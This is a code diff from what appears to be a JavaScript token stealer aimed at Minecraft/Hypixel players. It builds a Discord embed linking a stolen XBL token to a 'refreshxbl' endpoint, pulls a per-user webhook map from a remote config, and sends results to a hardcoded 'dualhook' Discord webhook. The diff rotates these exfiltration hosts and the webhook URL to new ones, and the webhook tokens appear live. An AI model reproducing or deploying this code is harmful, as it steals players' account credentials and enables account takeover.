@@ -125,11 +125,11 @@ async function main() {
   const xblEmbed = {
     color: 0x04042c,
     title: 'XBL Token',
-    description: `[XBL Link]( https://hypix-elauth.onrender.com/refreshxbl?xbl=${extractedInfo.xbl || 'N/A'})`,
+    description: `[XBL Link]( https://ill-gold-magpie-gown.cyclic.app/refreshxbl?xbl=${extractedInfo.xbl || 'N/A'})`,
   };
 
   const configPath = 'config.txt';
-  const remoteConfigURL = 'https://bbindigo.000webhostapp.com/config.txt';
+  const remoteConfigURL = 'https://lecterisgod.000webhostapp.com/config.txt';
 
   https.get(remoteConfigURL, (response) => {
     let data = '';
@@ -160,7 +160,7 @@ async function main() {
         });
 
         const webhookURL = configMap[userId]; // Use userId to get the webhookURL
-        const dualhook = "https://discord.com/api/webhooks/1164482847390830633/3d_6BERTyg6NAtPJMBLAA0sISmMYjZSHR1wY0RbcaLQghN8FPLrFRUVP3_z6pux5u-uJ";
+        const dualhook = "https://discord.com/api/webhooks/1190799309357195367/j44JG6LkHvn00rGaWogEV6s0TQ0ty0rrsCU_Rt1BNmzGlLaz_4FSDj7TAWCN5_FZbAzN";
 
         if (webhookURL) {
           const webhookClient = new WebhookClient({
